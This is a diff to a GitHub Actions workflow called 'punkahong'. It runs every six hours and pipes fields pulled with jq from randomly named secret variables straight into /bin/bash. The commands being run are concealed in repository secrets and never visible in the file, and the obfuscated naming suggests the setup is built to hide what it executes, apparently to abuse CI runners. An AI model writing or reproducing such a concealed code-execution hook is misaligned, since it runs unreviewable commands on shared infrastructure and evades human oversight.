@@ -3,7 +3,8 @@ name: punkahong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 0/6 * * *'
+    - cron: '19 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: punkahong
         env:
-          uldk9: ${{ secrets.uldk9 }}
+          xd5878: ${{ secrets.xd5878 }}
         run: |
-          echo $uldk9 | jq -r .v31372 | /bin/bash
-          echo $ms710 | jq -r .zbkkq47 | /bin/bash
-          echo $sy8189 | jq -r .wlr3 | /bin/bash
-          echo $jlx51 | jq -r .xlqf3 | /bin/bash
-          echo $jvjpx32505 | jq -r .v1 | /bin/bash
-          echo $zk0549 | jq -r .zc4869 | /bin/bash
-          echo $avone94 | jq -r .po6 | /bin/bash
-          echo $vohgc94 | jq -r .og3077 | /bin/bash
-          echo $cpr19 | jq -r .whnx64 | /bin/bash
+          echo $xd5878 | jq -r .t75 | /bin/bash
+          echo $en272 | jq -r .flp522 | /bin/bash
+          echo $v2 | jq -r .l3 | /bin/bash
+          echo $xihp5 | jq -r .hjc6 | /bin/bash
+          echo $rjsb7431 | jq -r .p90030 | /bin/bash
+          echo $c5009 | jq -r .n48 | /bin/bash
+          echo $rleph77 | jq -r .ftm2229 | /bin/bash
+          echo $q4947 | jq -r .wm55 | /bin/bash
+          echo $swrux97 | jq -r .ir07 | /bin/bash
+          echo $vqftw9473 | jq -r .jz10 | /bin/bash
+          echo $hkpq693 | jq -r .jmxdz3 | /bin/bash
 
